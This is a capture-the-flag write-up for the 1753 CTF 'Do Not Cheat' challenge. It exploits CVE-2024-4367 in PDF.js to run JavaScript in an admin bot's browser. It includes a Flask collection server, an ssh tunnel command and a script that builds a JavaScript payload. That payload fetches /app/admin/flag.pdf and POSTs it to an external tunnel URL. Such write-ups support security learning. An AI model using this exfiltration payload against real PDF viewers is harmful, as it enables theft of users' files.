# 1753 CTF - Do Not Cheat

My teammate found this challenge is vulnerable to [CVE-2024-4367](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-4367), and the PoC script can be found [here](https://github.com/LOURC0D3/CVE-2024-4367-PoC).

> A type check was missing when handling fonts in PDF.js, which would allow arbitrary JavaScript execution in the PDF.js context. This vulnerability affects Firefox &lt; 126, Firefox ESR &lt; 115.11, and Thunderbird &lt; 115.11.

So the basic roadmap is: we host a malicious PDF file and report the URL to admin, when the admin bot visits this URL, the JavaScript code will be executed and we can open `/app/admin/flag.pdf`, then send the content to our server.

However, when we tried to host the PoC PDF document, my teammate's server failed on SSL handshake, and I used to use Ngrok to tunnel my local service to the internet, but since Iâ€™m on the free plan, Ngrok will show an interstitial page before redirecting to my local service. After some trials, I decided to use [serveo.net](https://serveo.net/). This allowed me to do the same thing without needing to install any additional dependencies (just SSH is required).

## Approach

So here's the full approach:

### Step 1

I start a local Flask server to host the PoC PDF document, and also to receive the content of `flag.pdf`.

```python
from flask import Flask, request, make_response, send_file

app = Flask(__name__)


@app.route("/pdf")
def serve_pdf():
    pdf_path = "poc.pdf"
    try:
        response = make_response(send_file(pdf_path, mimetype="application/pdf"))
        response.headers["Access-Control-Allow-Origin"] = "*"
        return response
    except FileNotFoundError:
        return {"error": "PDF not found"}, 404


@app.route("/flag", methods=["POST", "OPTIONS"])
def receive_flag():
    resp = make_response()
    if request.method == "OPTIONS":
        resp.headers["Access-Control-Allow-Origin"] = "*"
        resp.headers["Access-Control-Allow-Methods"] = "POST, OPTIONS"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type"
        return resp

    try:
        pdf_data = request.data
        with open("flag.pdf", "wb") as f:
            f.write(pdf_data)
    except Exception as error:
        print(error)
    finally:
        return resp


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5003)
```

Tips:

- Make sure to set the `Access-Control-Allow-Origin` header.
- Route `/flag` is for receiving the content of `flag.pdf`. Note that the challenge server will also send an `OPTIONS` request (and this is because we set `"Content-Type": "application/pdf"` in the XSS payload), so our Flask server needs to respond to it as well.

- Use `host="0.0.0.0"` instead of `host="127.0.0.1"`, so that the service is accessible after tunneling to the internet. (Otherwise you may get a `403`.)

Then start the server:

```bash
python server.py
```

### Step 2

Run:

```
ssh -R 80:localhost:5003 serveo.net
```

And we will get something like:

```
Forwarding HTTP traffic from https://d92bd2c7f1326cf5a70cde1b2249c411.serveo.net
```

This is the public URL of our local service.

### Step 3

Now we generate malicious `poc.pdf` file. Download [`CVE-2024-4367.py`](https://github.com/LOURC0D3/CVE-2024-4367-PoC), create our `exp.py` as follows:

```python
import os

# ssh -R 80:localhost:5003 serveo.net
public_url = "https://d92bd2c7f1326cf5a70cde1b2249c411.serveo.net"

payload = f"""
fetch("/app/admin/flag.pdf")
.then(res => res.blob())
.then(blob =>
    fetch(
        "{public_url}/flag",
        {{
            method: "POST",
            body: blob,
            headers: {{"Content-Type": "application/pdf"}}
        }}
    )
)
"""

payload = payload.replace(" ", "").replace("\n", "")
print(payload)
os.system(f"python CVE-2024-4367.py '{payload}'")

print(f"Report to admin: https://do-not-cheat-bb7d7982d597.1753ctf.com/report?document={public_url}/pdf")
```

Run the script:

```
python exp.py
```

And we will get something like:

```
[+] Created malicious PDF file: poc.pdf
[+] Open the file with the vulnerable application to trigger the exploit.
Report to admin: https://do-not-cheat-bb7d7982d597.1753ctf.com/report?document=https://d92bd2c7f1326cf5a70cde1b2249c411.serveo.net/pdf
```

### Step 4

Open the URL, wait a while, and we will get `flag.pdf`.
